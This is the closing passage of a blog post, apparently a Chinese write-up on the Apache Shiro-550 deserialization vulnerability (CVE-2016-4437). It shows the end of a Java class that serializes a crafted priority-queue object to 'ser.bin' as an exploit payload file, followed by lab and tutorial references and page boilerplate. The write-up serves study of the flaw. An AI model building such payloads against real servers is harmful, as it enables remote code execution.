</span></span><span style="display:flex;"><span>        serialize(priorityQueue);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">serialize</span>(Object obj) <span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {
</span></span><span style="display:flex;"><span>            ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(<span style="color:#66d9ef">new</span> FileOutputStream(<span style="color:#e6db74">&#34;ser.bin&#34;</span>));
</span></span><span style="display:flex;"><span>            oos.<span style="color:#a6e22e">writeObject</span>(obj);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>参考资料：</p>
<p><a href="https://github.com/vulhub/vulhub/tree/master/shiro/CVE-2016-4437">https://github.com/vulhub/vulhub/tree/master/shiro/CVE-2016-4437</a></p>
<p><a href="https://arrnitage.github.io/Shiro-550/">https://arrnitage.github.io/Shiro-550/</a></p>
<p><a href="https://www.bilibili.com/video/BV1dq4y1B76x">https://www.bilibili.com/video/BV1dq4y1B76x</a></p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://z9nn8w.github.io/">w8nn9z Blog</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
